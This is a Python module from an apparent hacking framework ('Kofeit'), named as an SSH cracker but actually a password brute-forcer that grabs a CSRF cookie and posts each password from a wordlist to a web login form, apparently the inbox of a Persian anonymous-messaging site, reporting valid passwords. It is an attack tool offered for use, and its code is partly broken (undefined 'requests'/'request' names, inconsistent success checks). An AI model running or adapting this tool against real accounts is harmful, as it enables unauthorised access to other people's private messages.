#PLATFORM "[ANDROID,LINUX,Windows,Dos,Mac]" #KOFEIT#
#PACKAGE "Harfeto-1" #KOFEIT#
#TYPE "[Hacking,Pentest,Cracking,APT,CSRF]" #KOFEIT#
#VERSION "1.0" #KOFEIT#
#LANGUAGE "Python" #KOFEIT#
#AUTHOR "SINOCE" #KOFEIT#
#TYPE_RUN "REMOTE"  #KOFEIT#
#USY 4 #KOFEIT#
from requests import *
from Kofeit import *

class KOFEIT():
    def __init__(self):
        self.module_info = {
            "module_type":{
            "Hacking":True,
            "Pentest":True,
            "Cracking":True,
            "SessionHijacking":False,
            "CSRF":True,
            "APT":True
            },

            "platform_target":
                """
    Android:Supported(Only Termux,Pydroid3)
    Linux:Supported
    Windows":"Supported
    Dos:Supported
    Mac:Supported
                """,
            "module-language":"Python",
            "ctime":"1402/12/28 00:20",
            "version":"1.0"
        }
        self.module_name = "SSH-1 #KOFEIT#"
        self.options = {
            "Url":"",
            "UrlList":"",
            "PassList":"",
            }
        self.options_types = {
            "Url":"<class 'str'>",
            "UrlList":"<class 'str'>",
            "PassList":"<class 'str'>",
        }
        self.rq = {}
        self.author_module = "Sinoce-HSC"
        self.description = "Only SSH Cracker Easy."
        self.wait = 15
    def info(self):
        language = self.module_info["module-language"]
        platform = self.module_info["platform_target"]
        ctime = self.module_info['ctime']
        version  = self.module_info['version']
        print_status("#6[#2*#6] #0" + f"Module-Name:{self.module_name}\nLanguage-Module:{language}\nPlatform-Supported:\n[\n{platform}\n]\nDescription:{self.description}\nAuthor:{self.author_module}\nTime-Created:{ctime}\nVersion:{version}", True)
    def check_variable(self,var):
        if var:return True
        else:return False
    def show_options(self):
        print_status(f"""
Key		             Value
======================================
Url    :           {self.options['Url']}
UrlList      :           {self.options['UrlList']}
PassList      :           {self.options['PassList']}""",True)
    def set_value(self, key, value):
        if key in self.options:
            if self.options_types[key] == "<class 'list'>"  and str(type(value)) == "<class 'str'>":
                value = value.split(",")
                self.options[key] = value
                value_str = '[ ' + " | ".join(value) + ' ]'
                print_status("#6[#2*#6] #0" + f"#1{key} #3=#2>#66 {value_str}#0",True)
            elif self.options_types[key] == "<class 'str'>" and str(type(value)) == "<class 'str'>":
                self.options[key] = value
                print_status("#6[#2*#6] #0" + f"#1{key} #3=#2>#66 {value}#0",True)
            else:
                print_no(f"#4Type#2 {key}#3 Is #1{self.options_types[key]} #2can't #22set #5 > #22{str(type(value))}#0",True)
        else:
            print_no(f"#1{key}#22 Invalid #4Not#3 Found #2!#0",True)
    def help(self):
        print_status(f"""
#2info #3ARGS#5[#22None#5] #6(#55Show info Module #11{self.module_name.split(" ")[0]}#6)
#2set #3/ #2set_value #3ARGS#5[#2<#1KEY#2> #2<#1VALUE#2>#5] #6(#55Set A Key To Value#6)
#2show options #3/ #2show_options #3ARGS#5[#22None#5] #6(#55Show the options Module #11{self.module_name.split(" ")[0]}#6)
#2check #3ARGS#5[#22None#5] #6(#55Check Options Seted and Module #11{self.module_name.split(" ")[0]}#6)
#2exploit #3/ #2run #3ARGS#5[#22None#5] #6(#55run the module #11{self.module_name.split(" ")[0]}#6)""",True)
    def check(self):
        if self.options['Url']:
            try:
                get(self.options['Url'])
            except:
                print_star(f"#2Error Check Url while Get Method #1Url#5:#66{self.options['Url']}", True)
            else:
                self.rq["URL"] = "Url"
                print_ok("Url Verifyed .",True)
        elif self.options['UrlList']:
            if os.path.isfile(self.options['UrlList']):
                data = open(self.options['UrlList']).read().splitlines()
                if len(data) > 0 and data:
                    self.rq["URL"] = "UrlList"
                    print_ok("UrlList Verifyed .",True)
            else:
                print_no("UrlList File Not Exist",True)
        else:
            print_no("#2<#URL#2> #22Is #4 Required #2!#0")

        if self.options['PassList']:
            if os.path.isfile(self.options['PassList']):
                data = open(self.options['PassList']).read().splitlines()
                if len(data) > 0 and data:
                    self.rq["PWD"] = "PassList"
                    print_ok("PassList Verifyed .",True)
            else:
                print_no("PassList File Not Exist",True)
        else:
            print_no("PassList File Not Exist",True)
        if "PWD" in self.rq and "URL" in self.rq:
            self.rq["CHECK"] = True
            print_ok("#55Check#6 Compeleted #1OK",True)
        else:
            self.rq["CHECK"] = False
            print_ok("#55Check#6 Compeleted #2Not #22OK",True)
    def exploit(self):
        if self.rq['CHECK']:
            UK = self.rq['URL']
            PW = self.rq["PWD"]
            ULK = []
            if UK == "UrlList":
                for Url in open(self.options['UrlList']).read().splitlines():
                    if Url not in ULK:
                        for password in open(self.options['PassList']).read().splitlines():
                            try:
                                csrf_token = requests.get(Url).cookies["csrf_cookie_name"]
                                response = request.post(Url, data={"password":password,"submit":" نمایش  پیام های دریافتی","csrf_cookie_name":csrf_token})
                                if "رمز عبور خود را وارد نمایید" not in response.text:
                                    print_ok(f"#1Valid #2Password #3{Url}#5:#2{password}",True);ULK.append(Url)
                                else:
                                    print_no(f"#2InValid#1 Password #3{Url}#5:#2{password}",True)
                            except KeyboardInterrupt:
                                print_star("#2Cancled #3By #22User #5!#0",True)
                            except:
                                print_no(f"Error while Post Method Url:{Url}",True)
            elif UK == "Url":
                Url = self.options['Url']
                for password in open(self.options['PassList']).read().splitlines():
                    try:
                        csrf_token = requests.get(Url).cookies["csrf_cookie_name"]
                        response = requests.post(Url, data={"password":password,"submit":" نمایش  پیام های دریافتی","csrf_cookie_name":csrf_token})
                        if "رمز عبور خود را وارد نمایید"   in response.text and "ورود به حساب کاربری" not in response.text:
                            print_ok(f"#1Valid #2Password #3{Url}#5:#2{password}",True);ULK.append(Url)
                            break
                        else:
                            print_no(f"#2InValid#1 Password #3{Url}#5:#2{password}",True)
                    except KeyboardInterrupt:
                            print_star("#2Canceled #3By #1User#0",True)
                            break
                    except:
                            print_no(f"#2Error3 While#1 Post #5Method#0")
        else:
            print_star("Please Check Input Options and Type 'check' to check options",True)
